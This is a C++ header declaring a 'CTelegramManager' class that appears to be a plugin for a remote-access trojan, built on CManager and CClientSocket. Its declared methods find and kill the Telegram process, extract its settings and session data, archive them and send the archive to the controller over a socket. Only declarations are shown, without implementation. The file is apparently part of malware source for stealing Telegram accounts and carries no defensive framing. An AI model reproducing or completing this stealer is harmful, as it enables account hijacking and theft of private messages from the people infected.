#ifndef TELEGRAMMANAGER_H  
#define TELEGRAMMANAGER_H  
  
#include "Manager.h"  
#include "FileManager.h"  
#include <vector>  
  
class CTelegramManager : public CManager  
{  
public:  
    CTelegramManager(CClientSocket *pClient, LPBYTE lparam);  
    virtual ~CTelegramManager();  
    virtual void OnReceive(LPBYTE lpBuffer, UINT nSize); 
	UINT SendTelegramArchive(LPCTSTR localFilePath, LPCTSTR fileName);  // 发送Telegram压缩包
	
private:  
	CString m_archivePath;  // 存储压缩包路径  
    std::list<std::string> m_UploadList;  // 上传文件列表  
    HANDLE m_hFileSend;                   // 文件发送句柄  
    char m_strCurrentProcessFileName[MAX_PATH]; // 当前处理的文件名  

    CString m_settingsPath;  
    CString m_savePath;  
    CString m_telegramPath;  
      
    void ExtractTelegramData();  
    bool FindAndTerminateTelegram();  
    void CreateTelegramArchive();  
    bool GetProcessPath(DWORD processId, CString& processPath);  
    int SendToken(BYTE bToken);  
};  
  
#endif
